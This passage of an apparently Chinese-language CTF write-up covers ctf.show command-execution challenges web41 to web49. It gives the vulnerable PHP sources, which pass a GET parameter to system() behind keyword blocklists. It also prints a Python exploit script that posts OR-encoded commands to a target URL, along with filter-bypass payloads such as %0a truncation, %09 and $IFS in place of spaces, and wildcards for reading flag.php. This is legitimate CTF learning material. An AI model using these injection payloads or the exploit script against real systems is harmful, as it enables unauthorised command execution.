</span></span><span class="line"><span class="ln">17</span><span class="cl">			<span class="nv">$hex_j</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">		<span class="nv">$preg</span> <span class="o">=</span> <span class="s1">&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_i</span><span class="p">))</span><span class="o">||</span><span class="nx">preg_match</span><span class="p">(</span><span class="nv">$preg</span> <span class="p">,</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$hex_j</span><span class="p">))){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">					<span class="k">echo</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">  
</span></span><span class="line"><span class="ln">24</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">		<span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_i</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">		<span class="nv">$b</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="o">.</span><span class="nv">$hex_j</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">		<span class="nv">$c</span><span class="o">=</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">|</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">32</span><span class="o">&amp;</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">126</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">			<span class="nv">$contents</span><span class="o">=</span><span class="nv">$contents</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$a</span><span class="o">.</span><span class="s2">&#34; &#34;</span><span class="o">.</span><span class="nv">$b</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span><span class="nv">$contents</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="nx">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;php rce_or.php&#34;</span><span class="p">)</span>  <span class="c1">#æ²¡æœ‰å°†phpå†™å…¥ç¯å¢ƒå˜é‡éœ€æ‰‹åŠ¨è¿è¡Œ</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span><span class="o">!=</span><span class="mi">2</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;USERï¼špython exp.py &lt;url&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;egï¼š  python exp.py http://ctf.show/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">   <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">url</span><span class="o">=</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">def</span> <span class="nf">action</span><span class="p">(</span><span class="n">arg</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">   <span class="n">s1</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">   <span class="n">s2</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">   <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">arg</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">       <span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;rce_or.txt&#34;</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">       <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">           <span class="n">t</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">           <span class="k">if</span> <span class="n">t</span><span class="o">==</span><span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">               <span class="k">break</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">           <span class="k">if</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">               <span class="c1">#print(i)</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">               <span class="n">s1</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">               <span class="n">s2</span><span class="o">+=</span><span class="n">t</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">9</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">               <span class="k">break</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">       <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">   <span class="n">output</span><span class="o">=</span><span class="s2">&#34;(</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s1</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">|</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">s2</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">)&#34;</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">   <span class="k">return</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">   
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">   <span class="n">param</span><span class="o">=</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] your functionï¼š&#34;</span><span class="p">)</span> <span class="p">)</span><span class="o">+</span><span class="n">action</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;[+] your commandï¼š&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">   <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">       <span class="s1">&#39;c&#39;</span><span class="p">:</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">param</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">       <span class="p">}</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">   <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">   <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[*] result:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></div><p>å°†ä¸¤ä¸ªæ–‡ä»¶æ”¾åœ¨åŒä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œè¿è¡Œexp.pyå³å¯</p>
<p>ç¾½å¸ˆå‚…nb</p>
<p><img alt="image-20241124223329525" loading="lazy" src="../assets/image-20241124223329525.png"></p>
<blockquote>
<p>æ³¨æ„é“¾æ¥è¦ç”¨httpä¸èƒ½ç”¨https</p></blockquote>
<h4 id="web42">web42<a hidden class="anchor" aria-hidden="true" href="#web42">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 20:51:55
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é“é¢˜ä¼šå°†æˆ‘ä»¬è¾“å…¥çš„å‘½ä»¤ä¸<code>&quot; &gt;/dev/null 2&gt;&amp;1&quot;</code>è¿›è¡Œæ‹¼æ¥</p>
<blockquote>
<p>/dev/null 2&gt;&amp;1 æ„æ€æ˜¯å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯éƒ½é‡å®šå‘åˆ° /dev/null å³ä¸å›æ˜¾</p></blockquote>
<p>å¯¼è‡´æˆ‘ä»¬æ— æ³•æˆåŠŸæ‰§è¡Œ</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>%0a</code>æˆªæ–­çš„æ–¹å¼ç»•è¿‡</p>
<blockquote>
<p>tac fl*%0a</p></blockquote>
<p>or</p>
<blockquote>
<p>; //åˆ†å·
| //åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤
|| //åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤
&amp; //ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ
&amp;&amp; //ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</p>
<p>è¿‡æ»¤äº†åˆ†å·å’Œcatï¼Œå¯ä»¥ç”¨||å’Œ&amp;æ¥ä»£æ›¿åˆ†å·ï¼Œtacä»£æ›¿cat</p>
<p>å¯æ„é€ playload:
url/?c=tac flag.php||
url/?c=tac flag.php%26
æ³¨æ„ï¼Œè¿™é‡Œçš„&amp;éœ€è¦urlç¼–ç </p></blockquote>
<h4 id="web43">web43<a hidden class="anchor" aria-hidden="true" href="#web43">#</a></h4>
<p>è¿‡æ»¤äº†catã€ï¼›ï¼Œ</p>
<p>ä¸æ˜¯å¾ˆå½±å“</p>
<pre tabindex="0"><code>tac fl*%0a

or

tac flag.php||

...
//è®°å¾—è½¬urlç¼–ç 
</code></pre><h4 id="web44">web44<a hidden class="anchor" aria-hidden="true" href="#web44">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 21:32:01
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/;|cat|flag/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤äº†<code>;|cat|flag</code></p>
<p>å°é—®é¢˜</p>
<pre tabindex="0"><code>tac fl*%0a

or

tac f*||

...
//è®°å¾—è½¬urlç¼–ç 
</code></pre><h4 id="web45">web45<a hidden class="anchor" aria-hidden="true" href="#web45">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 21:35:34
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| /i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤äº†<code>;|cat|flag</code>å’Œç©ºæ ¼</p>
<p>å¯ä»¥ç”¨%09æˆ–$IFS$9ä»£æ›¿ç©ºæ ¼</p>
<pre tabindex="0"><code>tac%09fl*%0a

or

tac%09f*||

or

echo$IFS`tac$IFS*`%0A

...
//è®°å¾—è½¬urlç¼–ç 
</code></pre><h4 id="web46">web46<a hidden class="anchor" aria-hidden="true" href="#web46">#</a></h4>
<pre tabindex="0"><code>&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:50:19
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET[&#39;c&#39;])){
    $c=$_GET[&#39;c&#39;];
    if(!preg_match(&#34;/\;|cat|flag| |[0-9]|\\$|\*/i&#34;, $c)){
        system($c.&#34; &gt;/dev/null 2&gt;&amp;1&#34;);
    }
}else{
    highlight_file(__FILE__);
}
</code></pre><p>è¿‡æ»¤æœ‰ç‚¹å¤šå•Š</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*</p></blockquote>
<p>ä½†æ˜¯äº‹å®ä¸Šæˆ‘ä»¬ä¸Šé¢˜ä½¿ç”¨çš„æ–¹æ³•å¹¶ä¸ä¼šå—åˆ°å½±å“ï¼Œå› ä¸º%09æ˜¯urlç¼–ç ï¼Œä¸ä¼šè¢«å½“æˆæ•°å­—è¿‡æ»¤</p>
<pre tabindex="0"><code>tac%09fl*%0a

or

tac%09f*||

or

tac&lt;f*||

//è®°å¾—è½¬urlç¼–ç 
</code></pre><h4 id="web47">web47<a hidden class="anchor" aria-hidden="true" href="#web47">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 21:59:23
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤è¿™ä¹ˆå¤šO.oï¼Ÿ</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail</p></blockquote>
<p>ä½†æ˜¯å¹¸å¥½æˆ‘ç”¨çš„æ˜¯tac</p>
<pre tabindex="0"><code>tac%09fl*%0a

or

tac%09f*||

or

tac&lt;f*||

//è®°å¾—è½¬urlç¼–ç 
</code></pre><h4 id="web48">web48<a hidden class="anchor" aria-hidden="true" href="#web48">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:06:20
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤æ›´å¤šäº†</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`</p></blockquote>
<pre tabindex="0"><code>tac%09fl??.php%0a

or

tac%09fl??.php%7c%7c 
//è®°å¾—è½¬urlç¼–ç 
</code></pre><h4 id="web49">web49<a hidden class="anchor" aria-hidden="true" href="#web49">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
